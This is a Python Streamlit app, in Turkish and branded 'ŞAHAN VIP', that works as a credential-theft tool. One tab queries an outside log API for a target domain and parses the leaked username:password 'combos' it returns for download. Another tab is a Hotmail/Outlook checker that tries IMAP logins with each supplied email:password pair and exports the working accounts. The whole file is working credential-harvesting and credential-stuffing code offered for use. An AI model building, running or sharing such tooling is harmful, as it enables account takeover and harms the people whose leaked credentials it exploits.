import csv
from datetime import datetime
import imaplib
import json
import re
import requests
import streamlit as st

# ================= PAGE CONFIG =================
st.set_page_config(
    page_title="ŞAHAN VIP - Advanced OSINT & Log Extractor Suite",
    page_icon="⚡",
    layout="wide",
)

# ================= CUSTOM CSS =================
st.markdown(
    """
    <style>
    .stApp { background-color: #08090c; color: #d1d5db; }
    .card { background-color: #0f111a; border: 1px solid #1f222e; border-radius: 8px; padding: 15px; margin-bottom: 10px; }
    h1, h2, h3 { color: #ef4444; }
    </style>
""",
    unsafe_allow_html=True,
)

# ================= API URL =================
BASE_API_URL = "https://solidarksystems.alwaysdata.net/log.php?url="


# ================= PARSE MOTORU =================
class LogParser:

  @staticmethod
  def parse_log(response_text):
    combos = []
    lines_to_check = []

    try:
      data = json.loads(response_text)

      def extract_values(obj):
        if isinstance(obj, dict):
          for k, v in obj.items():
            extract_values(v)
        elif isinstance(obj, list):
          for item in obj:
            extract_values(item)
        elif isinstance(obj, str):
          lines_to_check.extend(obj.split("\n"))

      extract_values(data)
    except:
      pass

    raw_lines = (
        response_text.replace("<br>", "\n").replace("<br/>", "\n").split("\n")
    )
    lines_to_check.extend(raw_lines)

    blacklist = {
        "host",
        "user-agent",
        "accept",
        "referer",
        "origin",
        "cookie",
        "date",
        "server",
        "content-type",
        "connection",
        "pragma",
        "cache-control",
        "authorization",
        "aranan_domain",
        "bulunan_kayit_sayisi",
        "auth",
        "sonuclar",
    }

    for line in lines_to_check:
      line = line.strip()
      if not line:
        continue
      line = re.sub(r'^[\[\]{}"\']+|[\[\]{}"\']+$', "", line).strip()

      if "://" in line:
        parts = line.split("://", 1)
        if len(parts) > 1:
          rem = parts[1]
          if ":" in rem:
            last_colon_idx = rem.rfind(":")
            if last_colon_idx != -1:
              sub_str = rem[:last_colon_idx]
              user_colon_idx = sub_str.rfind(":")
              if user_colon_idx != -1:
                u = sub_str[user_colon_idx + 1 :].strip().strip("\"'/\\")
                p = rem[last_colon_idx + 1 :].strip().strip("\"'/\\")
                if (
                    len(u) > 1
                    and len(p) > 0
                    and u.lower() not in blacklist
                ):
                  combos.append((u, p))
                  continue

      if ":" in line and "://" not in line:
        parts = line.split(":", 1)
        u = parts[0].strip().strip("\"'{},[]<>")
        p = parts[1].strip().strip("\"'{},[]<>")
        if (
            len(u) > 1
            and len(p) > 0
            and u.lower() not in blacklist
            and len(u.split()) < 3
        ):
          combos.append((u, p))

    return list(dict.fromkeys(combos))


# ================= SIDEBAR =================
st.sidebar.markdown(
    "<h1 style='color: #ef4444; font-size: 24px;'>ŞAHAN</h1>",
    unsafe_allow_html=True,
)
st.sidebar.markdown(
    "<p style='color: #06b6d4; font-size: 11px; font-weight: bold;'>VIP LOG"
    " EXTRACTOR v4.0 (Web Edition)</p>",
    unsafe_allow_html=True,
)

menu = st.sidebar.radio(
    "Menü",
    [
        "⚡ Tekli URL Taraması",
        "✉️ Hotmail Checker",
        "🔍 Raw API Konsolu",
    ],
)

st.sidebar.markdown("---")
st.sidebar.markdown(
    "<div style='background-color: #0f111a; padding: 10px; border-radius: 6px;"
    " border: 1px solid #1f222e;'><b>Sistem İstatistiği:</b><br><font"
    " color='#10b981'>● VIP API Aktif</font></div>",
    unsafe_allow_html=True,
)

# ================= UYGULAMA EKRANI =================
if menu == "⚡ Tekli URL Taraması":
  st.markdown("## ŞAHAN VIP - Tekli URL Taraması")

  col1, col2, col3 = st.columns(3)
  with col1:
    st.markdown(
        "<div class='card'><font color='#9ca3af'>TOPLAM SAF"
        f" COMBO</font><br><h3 style='color: #ef4444; margin:0;'>{len(st.session_state.get('combos', []))}</h3></div>",
        unsafe_allow_html=True,
    )
  with col2:
    st.markdown(
        "<div class='card'><font color='#9ca3af'>SON SORGULANAN"
        f" DOMAIN</font><br><h3 style='color: #06b6d4;"
        f" margin:0;'>{st.session_state.get('last_domain', 'Yok')}</h3></div>",
        unsafe_allow_html=True,
    )
  with col3:
    st.markdown(
        "<div class='card'><font color='#9ca3af'>ŞAHAN ENGINE"
        f" STATUS</font><br><h3 style='color: #10b981;"
        f" margin:0;'>{st.session_state.get('status', 'BEKLEMEDE')}</h3></div>",
        unsafe_allow_html=True,
    )

  target = st.text_input(
      "ŞAHAN Hedef Domain Girin", placeholder="Örn: zulaoyun.com"
  )

  if st.button("🚀 Comboları Ayıkla", use_container_width=True):
    if target:
      st.session_state["last_domain"] = target
      st.session_state["status"] = "TARANIYOR..."
      with st.spinner(f"🌐 [ŞAHAN] Bağlanılıyor: {target}..."):
        try:
          res = requests.get(BASE_API_URL + target, timeout=15)
          if res.status_code == 200:
            parsed = LogParser.parse_log(res.text)
            st.session_state["combos"] = parsed
            st.session_state["raw_text"] = res.text
            st.session_state["status"] = "TAMAMLANDI"
            st.success(f"⚡ [ŞAHAN] Tarama bitti. Ayıklanan combo: {len(parsed)}")
            st.rerun()
          else:
            st.error(f"HTTP Hatası: {res.status_code}")
            st.session_state["status"] = "HATA"
        except Exception as e:
          st.error(f"Hata: {str(e)}")
          st.session_state["status"] = "HATA"

  combos = st.session_state.get("combos", [])
  if combos:
    import pandas as pd

    df = pd.DataFrame(combos, columns=["Kullanıcı / E-Posta", "Şifre"])
    st.dataframe(df, use_container_width=True)

    col_a, col_b = st.columns(2)
    with col_a:
      combo_text = "\n".join([f"{u}:{p}" for u, p in combos])
      st.download_button(
          "📋 Comboları TXT Olarak İndir",
          combo_text,
          file_name="sahan_combos.txt",
          mime="text/plain",
      )
    with col_b:
      csv_data = df.to_csv(index=False).encode("utf-8")
      st.download_button(
          "💾 CSV Formatında İndir",
          csv_data,
          file_name="SAHAN_Combos.csv",
          mime="text/csv",
      )

elif menu == "✉️ Hotmail Checker":
  st.markdown("## ŞAHAN VIP - Hotmail / Outlook Checker")
  st.markdown(
      "Her satıra bir adet **email:sifre** formatında hesap yazın:"
  )

  combo_input = st.text_area(
      "Hotmail Listesi",
      placeholder="ornek@hotmail.com:sifre123\ntest@outlook.com:sifre456",
      height=200,
  )

  if st.button("🔍 Hotmail Hesaplarını Kontrol Et", use_container_width=True):
    lines = combo_input.strip().split("\n")
    valid_accounts = []
    invalid_count = 0

    progress_bar = st.progress(0)
    status_text = st.empty()

    total = len(lines)
    for i, line in enumerate(lines):
      if ":" in line:
        parts = line.split(":", 1)
        email = parts[0].strip()
        password = parts[1].strip()

        status_text.text(f"Kontrol ediliyor: {email}")
        try:
          mail = imaplib.IMAP4_SSL("imap-mail.outlook.com", 993)
          mail.login(email, password)
          mail.logout()
          valid_accounts.append((email, password))
        except:
          invalid_count += 1

      if total > 0:
        progress_bar.progress((i + 1) / total)

    status_text.text("Kontrol tamamlandı!")
    st.success(f"✅ Çalışan Hesap Sayısı: {len(valid_accounts)}")

    if valid_accounts:
      import pandas as pd

      df_val = pd.DataFrame(valid_accounts, columns=["Email", "Şifre"])
      st.dataframe(df_val, use_container_width=True)

      hit_text = "\n".join([f"{e}:{p}" for e, p in valid_accounts])
      st.download_button(
          "📋 Çalışanları İndir (TXT)",
          hit_text,
          file_name="hotmail_hits.txt",
          mime="text/plain",
      )

elif menu == "🔍 Raw API Konsolu":
  st.markdown("## ŞAHAN Log Viewer - API Ham Verisi")
  raw_text = st.session_state.get("raw_text", "Henüz veri çekilmedi.")
  st.text_area("Ham Yanıt", raw_text, height=500)
